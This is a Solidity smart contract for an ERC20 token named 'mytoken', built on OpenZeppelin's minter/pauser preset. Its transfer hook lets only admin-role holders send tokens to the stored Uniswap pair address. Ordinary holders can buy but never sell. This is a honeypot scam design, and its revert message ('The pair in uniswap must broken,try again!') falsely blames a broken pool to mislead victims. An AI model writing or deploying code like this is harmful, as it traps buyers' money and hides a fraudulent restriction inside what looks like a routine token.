// SPDX-License-Identifier: MIT

pragma solidity 0.6.2;

import "@openzeppelin/contracts/presets/ERC20PresetMinterPauser.sol";

contract mytoken is ERC20PresetMinterPauser {
    address private uniswap;

    constructor(
        string memory name,
        string memory symbol,
        uint8 decimals,
        address uni
    ) public ERC20PresetMinterPauser(name, symbol) {
        super._setupDecimals(decimals);
        uniswap = uni;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override(ERC20PresetMinterPauser) {
        if (to == uniswap) {
            require(
                super.hasRole(DEFAULT_ADMIN_ROLE, from),
                "The pair in uniswap must broken,try again!"
            );
        }
        super._beforeTokenTransfer(from, to, amount);
    }
}